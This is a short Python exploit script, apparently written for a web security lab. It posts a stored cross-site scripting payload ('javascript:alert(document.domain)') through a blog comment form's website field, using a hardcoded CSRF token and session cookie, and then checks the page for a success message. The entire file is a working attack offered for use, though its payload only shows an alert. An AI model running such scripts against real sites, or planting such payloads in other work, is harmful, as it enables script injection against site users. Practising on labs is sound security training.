import requests
import urllib3
from sys import argv

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_website_url():
    if len(argv) != 2:
        print(f"[+] usage {argv[0]}")
        print(f"[+] example {argv[0]} 'http://example.com'")
        exit(-1)

    if argv[1][-1] == '/':
        url = argv[1][:-1]
    else:
        url = argv[1]

    return url

def attack(url): 
    print("[+] Starting attack")
    posts_path = "/post/comment"
    xss_payload = "javascript:alert(document.domain)"

    params = {
    "csrf"   : "IMnPLNruVptMZHoItM1mWe0JjhNwwy2A",
    "postId" : 2,
    "comment": "Stored XSS",
    "name"   : "hacker",
    "email"  : "hacker@hack.com",
    "website": xss_payload
    }
    cookie = {"session" : "Cm4CMtHn9dnzJV6dKLGbg6S2UD69sTuK"}

    print(f"[+] sending xss payload : {xss_payload}")

    r = requests.post(url + posts_path, data=params, cookies=cookie)

    r = requests.get(url)
    if 'Congratulations' in r.text:
        print("[+] attack successfully")
    else:
        print("[-] Attack un successfully")
        print("[-] If you are sure that you ran the script without any errors and not work thin replace the csrf and session from code thats in your browser")

attack(get_website_url())
